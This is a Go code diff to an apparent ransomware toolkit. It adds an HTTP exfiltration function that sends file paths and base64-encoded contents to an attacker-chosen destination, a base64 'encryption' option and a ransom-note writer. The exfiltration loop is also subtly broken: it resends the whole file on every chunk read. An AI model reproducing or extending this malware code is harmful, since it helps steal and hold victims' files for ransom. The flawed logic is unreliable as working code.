@@ -7,7 +7,9 @@ import (
 	"crypto/rand"
 	"crypto/sha256"
 	"encoding/base64"
+	"io"
 	"net/http"
+	"os"
 	"time"
 )
 
@@ -18,6 +20,11 @@ var DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
 
 // DefaultExfil is the default exfil behavior.
 var DefaultExfil = func(path string, b []byte) error {
+	return nil
+}
+
+// DefaultNotify is the default notify behavior.
+var DefaultNotify = func() error {
 	return nil
 }
 
@@ -50,36 +57,76 @@ func AESEncrypt(passwd string) EncryptFunc {
 	}
 }
 
+// Base64Encode will "encrypt" using base64, obvs.
+func Base64Encode(fn string, b []byte) ([]byte, error) {
+	return []byte(base64.StdEncoding.EncodeToString(b)), nil
+}
+
 // HTTPExfil will return a function pointer to an ExfilFunc that
 // reaches out to the specified destination and uses the specified
 // headers.
 func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 	return func(path string, b []byte) error {
+		var b64 string
 		var e error
+		var n int
 		var req *http.Request
+		var stream = bytes.NewReader(b)
+		var tmp [4 * 1024 * 1024]byte
 
-		// Create request
-		req, e = http.NewRequest(
-			http.MethodPost,
-			dst,
-			bytes.NewBuffer(
-				[]byte(path+" "+base64.StdEncoding.EncodeToString(b)),
-			),
+		for {
+			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
+				return nil
+			} else if e != nil {
+				return e
+			}
+
+			// Create request
+			b64 = base64.StdEncoding.EncodeToString(b)
+			req, e = http.NewRequest(
+				http.MethodPost,
+				dst,
+				bytes.NewBuffer([]byte(path+" "+b64)),
+			)
+			if e != nil {
+				return e
+			}
+
+			// Set headers
+			for k, v := range headers {
+				req.Header.Set(k, v)
+			}
+
+			// Set timeout to 1 second
+			http.DefaultClient.Timeout = time.Second
+
+			// Send Message
+			http.DefaultClient.Do(req)
+		}
+	}
+}
+
+// RansomNote will return a function pointer to a NotifyFunc that
+// appends the specified text to the specified file.
+func RansomNote(path string, text []string) NotifyFunc {
+	return func() error {
+		var e error
+		var f *os.File
+
+		f, e = os.OpenFile(
+			path,
+			os.O_APPEND|os.O_CREATE|os.O_RDWR,
+			0644,
 		)
 		if e != nil {
 			return e
 		}
+		defer f.Close()
 
-		// Set headers
-		for k, v := range headers {
-			req.Header.Set(k, v)
+		for _, line := range text {
+			f.WriteString(line + "\n")
 		}
 
-		// Set timeout to 1 second
-		http.DefaultClient.Timeout = time.Second
-
-		// Send Message
-		http.DefaultClient.Do(req)
 		return nil
 	}
 }
